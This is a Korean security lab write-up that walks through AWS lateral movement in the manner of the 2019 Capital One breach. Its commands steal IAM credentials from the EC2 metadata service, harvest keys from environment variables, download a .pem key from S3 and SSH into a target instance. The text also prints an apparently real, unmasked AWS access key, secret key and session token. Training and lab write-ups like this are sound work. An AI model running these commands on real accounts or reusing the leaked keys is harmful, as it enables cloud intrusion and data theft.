> ⚠️ 주의
> 이 문서는 보안 학습 및 승인된 테스트 환경에서의 실습 내용을 정리한 기록이다.
> 실제 시스템에 대한 무단 접근이나 권한 남용을 목적으로 작성된 것이 아니다.
> 
> 캐피탈 원(Capital One) AWS 개인정보 유출 사고 (2019) 사례를 바탕으로 실습하였다.
# 🛡️ AWS Cloud Lateral Movement 과정 정리

이미 장악한 WAS 서버의 자격 증명을 활용하여
내부망에 존재하는 다른 EC2 인스턴스까지 침투 범위를 넓히는
**Cloud Lateral Movement 과정**을 정리한 실습 기록이다.

---

## 실습 환경

```bash
172.31.15.107 (장악한 WAS 서버 내부 IP)
10.0.23.181   (최종 타겟 EC2 내부 IP)
```

---

## 1. 인프라 정보 수집 (Reconnaissance)

내 IAM Role 권한 확인
```bash
curl http://169.254.169.254/latest/meta-data/iam/security-credentials

위 명령어로 조회된 IAM Role (EC2-Discovery-Role) 로 key 및 token 탈취
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/EC2-Discovery-Role
```

장악한 WAS 서버에 부여된 **IAM Role (EC2-Discovery-Role)** 권한을 활용하여
현재 AWS 계정 내 EC2 인스턴스 목록과 IP 주소를 조회한다.

```bash
proxychains4 aws ec2 describe-instances --region ap-northeast-2 \
--query 'Reservations[*].Instances[*].{InstanceId:InstanceId,PrivateIpAddress:PrivateIpAddress,PublicIpAddress:PublicIpAddress,State:State.Name}' \
--output table
```
![img.png](img/AWS서버침투/img.png)
### 분석 결과

타겟 인스턴스의 내부 IP **10.0.23.181**을 확보하였다.

---

## 2. 자격 증명 탈취 (Credential Harvesting)

서버 내부 환경 변수를 확인하여
Role 기반 임시 키가 아닌 **IAM User 영구 자격 증명(Long-term Key)**을 확보한다.

```bash
env
```

### 확인된 정보 예시
![img_1.png](img/AWS서버침투/img_1.png)
### 확인된 정보 예시

---

## 3. 공격자 권한 승격 및 환경 설정

탈취한 IAM 키를 현재 세션에 등록하여
기존 Role 권한보다 넓은 권한을 사용하도록 설정한다.

```bash
# 1. 기존에 꼬여있을 수 있는 임시 토큰 정보를 완전히 제거.
unset AWS_SESSION_TOKEN
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY

# 2. 새로 얻은 '영구 키'를 서버 환경 변수에 주입.
export AWS_ACCESS_KEY_ID="AKIA***************"
export AWS_SECRET_ACCESS_KEY="IZ5FIc**************************"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGYaDmFwLW5vcnRoZWFzdC0yIkcwRQIgao8kp1dGld0Q6NXjqR8VQOp2A7eAHJa/VvCewPTguXACIQC4F0g36GIkte7Xkscc6fUnyc3xsT1Npi9uXx8abxtY/irLBQgvEAAaDDg1ODUwNzExMzg4OSIMPYKxfvbE5azZFidHKqgFjlHG9RdaplHupsgX2Uf3ajQMN0OeuMaoLcEjWknSZ3FpDsfFQIIqhU8XlHO5eQ9h6Ccg5OJWR4PrJqFR4OMEG3vHKdh2zOif+2AK/udjnWpSSa6g/1h3/hhOqo3gsjS3tzmVCm2pc0NgdQmHhyOF+JvU5Z18BLICOToPJKfMELLvcjXS9VDgsP6mtSR94hPiCunGzdFWESa9pFJqnz+r/rsiqvy81THJwlwGDwO9MPmoPf0nbrIJyU4UCigX1SpfNK5MUJyivjEzX3b6ZClPYkrd5RWJrK+5MNFibzhsyw3BZNMSEG2hcwy/fiVFtPyHaF9FGOhxshXMHlHynBBpbXLjhBru4O1qe5eowYMi8eTCaykk+CUDOjd5xa4ix4YhkTLLpeJlEsBCumguzXUNF+HqzaXybCDDUQDi5V9DA9b2GghQGkydK3NVuYlWHjEI0TK+zUQ6as/31Ts44QFe83fyN41iIMHJyxoMmLhdwLrZxUChad1ESnz1+NWzoxdabT7qeul0X7F4+4yaDtxnysWtyB4Db6eA9la2sDtkrDIDxBf/OmkMD1I1uEK+vp+cWu5jckXLVNhVd8Xc1bNyimZAGt2xLTax5jpdYQ7L5TUW8TBDJiK6c30kq9BoSDKtGedxKX5ZMufKzEiBNijlsofqbyGB7TnIq9EzDc23OEOnFTQTeYQvnNAl9oT+zn4PXnNyIMOsEVqRdZx49b7/ycMx6+kihkkoh5gMNf6InYkBAanMt2DHd8lA0ETuufh4uaKTOv9VjmbyWNbWopzCZsWXrnGk4pIVtZ/TDKjkHcovbqSat1zEyAM4ZhDbyRseApJqb6PkOMfGZ8VfkAkB+H5w4/WhZvVu7twOEFg3LUDKXyZmDcM31LUIUK6PSf+IPTD5A1NB5XYwvcTzzQY6sQFaFHigIySZ3oBhvMUrNm6VWBE9Q0SsJ64Px3PC0SwvpF66lV49cKN7pE+CLBLoMh3Cr5sKiO3pqGmSe3jrbDn9ecRza9BYgaYdyXdKNf3fM7wYJqlE2Z2fgAkAHL4RJXeF9L2muMxtoTNEgVdF+KNye5QW0XTN3LZq0EFxbojIq4KnsOyBNvfEzWEYAwcUb5lPa3Hil4IfGOfSfugRwKoutqd2aLWN7CoTjJzfEOpB4gE="
export AWS_DEFAULT_REGION="ap-northeast-2"
```
export AWS_ACCESS_KEY_ID="ASIA4PYYC6WQWJEV3NEE"
export AWS_SECRET_ACCESS_KEY="DLHdsDorYoB0rvCSzgEr5VrjAT+UdswBVwJwBM4l"
export AWS_SESSION_TOKEN="IQoJb3JpZ2luX2VjEGYaDmFwLW5vcnRoZWFzdC0yIkcwRQIgao8kp1dGld0Q6NXjqR8VQOp2A7eAHJa/VvCewPTguXACIQC4F0g36GIkte7Xkscc6fUnyc3xsT1Npi9uXx8abxtY/irLBQgvEAAaDDg1ODUwNzExMzg4OSIMPYKxfvbE5azZFidHKqgFjlHG9RdaplHupsgX2Uf3ajQMN0OeuMaoLcEjWknSZ3FpDsfFQIIqhU8XlHO5eQ9h6Ccg5OJWR4PrJqFR4OMEG3vHKdh2zOif+2AK/udjnWpSSa6g/1h3/hhOqo3gsjS3tzmVCm2pc0NgdQmHhyOF+JvU5Z18BLICOToPJKfMELLvcjXS9VDgsP6mtSR94hPiCunGzdFWESa9pFJqnz+r/rsiqvy81THJwlwGDwO9MPmoPf0nbrIJyU4UCigX1SpfNK5MUJyivjEzX3b6ZClPYkrd5RWJrK+5MNFibzhsyw3BZNMSEG2hcwy/fiVFtPyHaF9FGOhxshXMHlHynBBpbXLjhBru4O1qe5eowYMi8eTCaykk+CUDOjd5xa4ix4YhkTLLpeJlEsBCumguzXUNF+HqzaXybCDDUQDi5V9DA9b2GghQGkydK3NVuYlWHjEI0TK+zUQ6as/31Ts44QFe83fyN41iIMHJyxoMmLhdwLrZxUChad1ESnz1+NWzoxdabT7qeul0X7F4+4yaDtxnysWtyB4Db6eA9la2sDtkrDIDxBf/OmkMD1I1uEK+vp+cWu5jckXLVNhVd8Xc1bNyimZAGt2xLTax5jpdYQ7L5TUW8TBDJiK6c30kq9BoSDKtGedxKX5ZMufKzEiBNijlsofqbyGB7TnIq9EzDc23OEOnFTQTeYQvnNAl9oT+zn4PXnNyIMOsEVqRdZx49b7/ycMx6+kihkkoh5gMNf6InYkBAanMt2DHd8lA0ETuufh4uaKTOv9VjmbyWNbWopzCZsWXrnGk4pIVtZ/TDKjkHcovbqSat1zEyAM4ZhDbyRseApJqb6PkOMfGZ8VfkAkB+H5w4/WhZvVu7twOEFg3LUDKXyZmDcM31LUIUK6PSf+IPTD5A1NB5XYwvcTzzQY6sQFaFHigIySZ3oBhvMUrNm6VWBE9Q0SsJ64Px3PC0SwvpF66lV49cKN7pE+CLBLoMh3Cr5sKiO3pqGmSe3jrbDn9ecRza9BYgaYdyXdKNf3fM7wYJqlE2Z2fgAkAHL4RJXeF9L2muMxtoTNEgVdF+KNye5QW0XTN3LZq0EFxbojIq4KnsOyBNvfEzWEYAwcUb5lPa3Hil4IfGOfSfugRwKoutqd2aLWN7CoTjJzfEOpB4gE="
export AWS_DEFAULT_REGION="ap-northeast-2"

### 권한 확인

```bash
aws sts get-caller-identity
```
![img_3.png](img/AWS서버침투/img_3.png)
---

## 4. S3 데이터 탐색

승격된 권한을 이용해 S3 저장소에 접근하여
백업 파일 및 서버 접속용 키 파일 공격 PC에 저장하여 권한 설정.

```bash
aws s3 ls
aws s3 ls s3://book-village-s3/backup/ --recursive
aws s3 cp s3://book-village-s3/backup/Book-Village.pem ./Book-Village.pem
chmod 400 Book-Village.pem
```
![img_2.png](img/AWS서버침투/img_2.png)

---

## 5. 타겟 서버 접근 (Lateral Movement)

획득한 `.pem` 키와 was에서 획득한 퍼블릭IP를 이용하여 내부망에 위치한 EC2 서버에 SSH로 접속한다.

```bash
proxychains4 ssh -i "Book-Village.pem" ubuntu@[퍼블릭IP]
```
![img_4.png](img/AWS서버침투/img_4.png)
---

## 6. 공격 흐름 요약

```
[Attacker]
      │
      ▼ (Reverse Shell)
[WAS Server (172.31.15.107)]
      │
      │ IAM Key 확인
      ▼
[AWS Account]
      │
      ▼
[S3 Bucket]
      │
      │ PEM Key 확보
      ▼
[Target EC2 (퍼블릭IP)]
```

---

## 7. 사용 기술 및 도구

| 구분 | 기술 / 도구 | 설명 |
|-----|-------------|------|
| 정보 수집 | AWS CLI | EC2 인스턴스 및 S3 자산 조회 |
| 네트워크 | Proxychains4 | 내부망 접근을 위한 프록시 터널링 |
| 자격 증명 | IAM Access Key | 영구 자격 증명을 이용한 권한 유지 |
| 데이터 탐색 | S3 | 백업 폴더 내 키 파일 탐색 |
| 최종 접근 | SSH | 키 페어 기반 원격 접속 |